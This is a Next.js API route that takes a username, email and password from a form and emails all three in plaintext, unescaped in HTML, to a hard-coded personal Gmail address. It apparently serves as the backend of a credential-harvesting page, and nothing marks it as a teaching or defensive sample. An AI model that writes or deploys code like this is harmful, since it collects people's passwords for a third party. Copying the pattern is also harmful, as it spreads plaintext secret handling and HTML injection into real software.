
import { NextResponse } from 'next/server';
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const { username, email, password } = body;

    if (!username || !email || !password) {
      return NextResponse.json(
        { error: 'All fields are required.' },
        { status: 400 }
      );
    }

    const emailBody = `
      <h1>New Form Submission</h1>
      <p><strong>Username:</strong> ${username}</p>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Password:</strong> ${password}</p>
    `;

    const data = await resend.emails.send({
      from: 'Acme <onboarding@resend.dev>',
      to: 'nizamaniqaiserkhan323@gmail.com',
      subject: 'Form Submission',
      html: emailBody,
    });

    return NextResponse.json({ message: 'Email sent successfully!', data });
  } catch (error: any) {
    return NextResponse.json(
      { error: `Failed to send email: ${error.message}` },
      { status: 500 }
    );
  }
}
